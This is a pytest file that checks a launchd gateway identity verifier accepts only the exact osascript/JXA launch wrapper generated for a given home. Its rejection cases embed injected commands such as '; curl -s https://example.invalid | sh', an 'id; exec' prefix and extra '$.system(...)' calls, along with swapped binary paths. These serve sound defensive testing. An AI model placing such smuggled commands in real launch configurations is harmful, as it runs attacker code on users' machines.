"""Local patch fix-launchd-jxa-identity: the installer's own osascript/JXA hull is a verified identity.

Since v0.22.1 `hermes gateway install` writes ProgramArguments as an osascript JXA program that execs the
checkout launcher (launchd_program_arguments, #71206). The read-only identity check only knew Python/Hermes
argv, so the desktop app refused the healthy launchd gateway with service_identity_unverified. The patch
accepts exactly the hull the generator emits for this home and rejects every other launcher, profile, log
target or extra shell/JavaScript code. The JavaScript string is compared whole, never parsed or searched.
"""
import plistlib
import sys
from pathlib import Path

import pytest

from hermes_cli import gateway_runtime_service_identity as identity
from hermes_cli.gateway_launchd import launchd_program_arguments
from hermes_cli._launchers import runtime_command

LAUNCHER = str(Path(identity.__file__).resolve().parents[1] / ".hermes" / "bin" / "hermes")
OSASCRIPT = "/usr/bin/osascript"


@pytest.fixture()
def home(tmp_path):
    profile = tmp_path / ".hermes" / "profiles" / "evm"
    (profile / "logs").mkdir(parents=True)
    return profile.resolve()


def _literal_hull(home: Path, *, launcher=LAUNCHER, profile="evm", out=None, err=None, inner_extra="",
                  shell_extra="", js_extra="") -> list[str]:
    # Byte-for-byte the shape installed on the production Mac (plist of 2026-10-15), built by hand on
    # purpose: it pins the generator output, so a generator change shows up here instead of silently widening.
    logs = home / "logs"
    out = out or f"{logs}/gateway.log"
    err = err or f"{logs}/gateway.error.log"
    shell = (f"exec {launcher} --run-module hermes_cli.stderr_timestamp --error-log {logs}/gateway.error.log -- "
             f"{launcher} --profile {profile} gateway run --external-supervisor{inner_extra} >> {out} 2>> {err}"
             f"{shell_extra}")
    js = (f'ObjC.import("stdlib"); const status=$.system("{shell}"); const signal=status & 127; '
          f"$.exit(status === -1 ? 1 : signal === 0 ? (status >> 8) & 255 : 128 + signal);{js_extra}")
    return [OSASCRIPT, "-l", "JavaScript", "-e", js]


def _generated_hull(home: Path) -> list[str]:
    logs = home / "logs"
    command = [LAUNCHER, "--run-module", "hermes_cli.stderr_timestamp", "--error-log", str(logs / "gateway.error.log"),
               "--", LAUNCHER, "--profile", "evm", "gateway", "run", "--external-supervisor"]
    return launchd_program_arguments(command, logs / "gateway.log", logs / "gateway.error.log")


def _launchctl_print(argv: list[str], home: Path) -> str:
    return ("gui/123/ai.hermes.gateway-evm = {\n\tstate = running\n\tprogram = " + argv[0] + "\n\targuments = {\n"
            + "\n".join("\t\t" + a for a in argv) + "\n\t}\n\tenvironment = {\n\t\tHERMES_SUPERVISED_CHILD => 1\n"
            + f"\t\tHERMES_HOME => {home}\n\t}}\n}}")


def test_literal_installed_hull_equals_generator_output(home):
    assert _literal_hull(home) == _generated_hull(home)


def test_installed_hull_is_verified(home):
    identity._verify_launchd_argv(_literal_hull(home), home)


def test_unrecognized_home_cannot_fall_back_to_looser_jxa_verification(tmp_path):
    custom = tmp_path / "custom-home"
    # The upstream decoder can regenerate this template, but its profile and log
    # destinations have no canonical binding to this home.
    with pytest.raises(ValueError, match="service_identity_unverified"):
        identity._verify_launchd_argv(_literal_hull(custom, profile="default"), custom)


def _inline_command(home, monkeypatch):
    from hermes_cli import gateway

    monkeypatch.setattr(gateway, "get_python_path", lambda: sys.executable)
    root = Path(gateway.PROJECT_ROOT).resolve()
    inner = runtime_command(root, ["--profile", "evm", "gateway", "run", "--external-supervisor"], python=sys.executable)
    return runtime_command(root, ["--error-log", str(home / "logs/gateway.error.log"), "--", *inner],
                           module="hermes_cli.stderr_timestamp", python=sys.executable)


def test_exact_inline_hull_is_verified(home, monkeypatch):
    argv = launchd_program_arguments(_inline_command(home, monkeypatch), home / "logs/gateway.log", home / "logs/gateway.error.log")
    identity._verify_launchd_argv(argv, home)
    identity.verify_launchd_loaded(_launchctl_print(argv, home), home, uid=123, username="owner")


@pytest.mark.parametrize("variant", [
    "profile", "stdout", "stderr", "error_log", "supervisor", "outer_python", "inner_python",
    "bootstrap", "extra_flag", "extra_shell", "extra_js", "leading_space", "trailing_tab",
])
def test_altered_inline_hull_is_rejected(home, monkeypatch, variant):
    command = _inline_command(home, monkeypatch)
    out, err = home / "logs/gateway.log", home / "logs/gateway.error.log"
    if variant == "profile":
        command[-4] = "content"
    elif variant == "stdout":
        out = home / "other.log"
    elif variant == "stderr":
        err = home / "other.error.log"
    elif variant == "error_log":
        command[5] = str(home / "other.error.log")
    elif variant == "supervisor":
        command.pop()
    elif variant == "outer_python":
        command[0] = "/private/tmp/python3"
    elif variant == "inner_python":
        command[7] = "/private/tmp/python3"
    elif variant == "bootstrap":
        command[3] += "; print('extra')"
    elif variant == "extra_flag":
        command.append("--quiet")
    argv = launchd_program_arguments(command, out, err)
    if variant == "extra_shell":
        argv[4] = argv[4].replace("exec ", "id; exec ", 1)
    elif variant == "extra_js":
        argv[4] += " $.system('id');"
    elif variant == "leading_space":
        argv[4] = " " + argv[4]
    elif variant == "trailing_tab":
        argv[4] += "\t"
    with pytest.raises(ValueError, match="service_identity_unverified"):
        identity._verify_launchd_argv(argv, home)
    with pytest.raises(ValueError, match="service_identity_unverified"):
        identity.verify_launchd_loaded(_launchctl_print(argv, home), home, uid=123, username="owner")


def test_loaded_launchd_job_with_installed_hull_is_verified(home):
    identity.verify_launchd_loaded(_launchctl_print(_literal_hull(home), home), home, uid=123, username="owner")


def test_installed_plist_with_hull_is_verified(home):
    argv = _literal_hull(home)
    definition = plistlib.loads(plistlib.dumps({
        "Label": "ai.hermes.gateway-evm", "ProgramArguments": argv,
        "EnvironmentVariables": {"HERMES_HOME": str(home), "HERMES_SUPERVISED_CHILD": "1"},
    }))
    identity.verify_launchd_plist(definition, "ai.hermes.gateway-evm", home)


@pytest.mark.parametrize("variant", [
    "foreign_launcher", "other_profile", "other_stdout", "other_stderr", "extra_shell", "extra_js",
    "extra_gateway_flag", "missing_supervisor_flag", "embedded_in_other_js", "do_shell_script",
    "extra_osascript_arg", "other_language", "other_osascript_path", "trailing_space", "leading_space", "trailing_tab", "leading_tab",
    "timestamp_error_log",
])
def test_altered_hull_is_rejected(home, variant):
    argv = _literal_hull(home)
    if variant == "foreign_launcher":
        argv = _literal_hull(home, launcher="/opt/homebrew/Cellar/hermes-agent/0.22.1/bin/hermes")
    elif variant == "other_profile":
        argv = _literal_hull(home, profile="content")
    elif variant == "other_stdout":
        argv = _literal_hull(home, out="/private/tmp/gateway.log")
    elif variant == "other_stderr":
        argv = _literal_hull(home, err="/private/tmp/gateway.error.log")
    elif variant == "extra_shell":
        argv = _literal_hull(home, shell_extra="; curl -s https://example.invalid | sh")
    elif variant == "extra_js":
        argv = _literal_hull(home, js_extra=' $.system("touch /private/tmp/x");')
    elif variant == "extra_gateway_flag":
        argv = _literal_hull(home, inner_extra=" --replace")
    elif variant == "missing_supervisor_flag":
        argv[4] = argv[4].replace(" --external-supervisor", "")
    elif variant == "embedded_in_other_js":
        argv[4] = 'const hull = ' + repr(argv[4]) + '; ObjC.import("stdlib"); $.system("id");'
    elif variant == "do_shell_script":
        argv[4] = argv[4].replace('ObjC.import("stdlib"); const status=$.system(',
                                  'const app=Application.currentApplication(); app.includeStandardAdditions=true; '
                                  'const status=app.doShellScript(')
    elif variant == "extra_osascript_arg":
        argv = [*argv, "--"]
    elif variant == "other_language":
        argv[2] = "AppleScript"
    elif variant == "other_osascript_path":
        argv[0] = "/private/tmp/osascript"
    elif variant == "trailing_space":
        argv[4] += " "
    elif variant == "leading_space":
        argv[4] = " " + argv[4]
    elif variant == "trailing_tab":
        argv[4] += "\t"
    elif variant == "leading_tab":
        argv[4] = "\t" + argv[4]
    elif variant == "timestamp_error_log":
        argv[4] = argv[4].replace(f"--error-log {home}/logs/gateway.error.log", "--error-log /private/tmp/foreign.error.log")
    with pytest.raises(ValueError, match="service_identity_unverified"):
        identity._verify_launchd_argv(argv, home)
    with pytest.raises(ValueError, match="service_identity_unverified"):
        identity.verify_launchd_loaded(_launchctl_print(argv, home), home, uid=123, username="owner")


def test_hull_for_another_home_is_rejected(home, tmp_path):
    other = tmp_path / ".hermes" / "profiles" / "content"
    (other / "logs").mkdir(parents=True)
    with pytest.raises(ValueError, match="service_identity_unverified"):
        identity._verify_launchd_argv(_literal_hull(other.resolve(), profile="content"), home)


@pytest.mark.parametrize("argv_tail", [
    ["-m", "hermes_cli.main", "--profile", "evm", "gateway", "run", "--external-supervisor"],
    ["-m", "hermes_cli.stderr_timestamp", "--error-log", "/x/gateway.error.log", "--",
     sys.executable, "-m", "hermes_cli.main", "gateway", "run", "--quiet"],
])
def test_python_start_forms_still_verified(home, argv_tail):
    identity._verify_launchd_argv([sys.executable, *argv_tail], home)


def test_direct_launcher_form_still_verified(home):
    identity._verify_launchd_argv([LAUNCHER, "--profile", "evm", "gateway", "run", "--external-supervisor"], home)
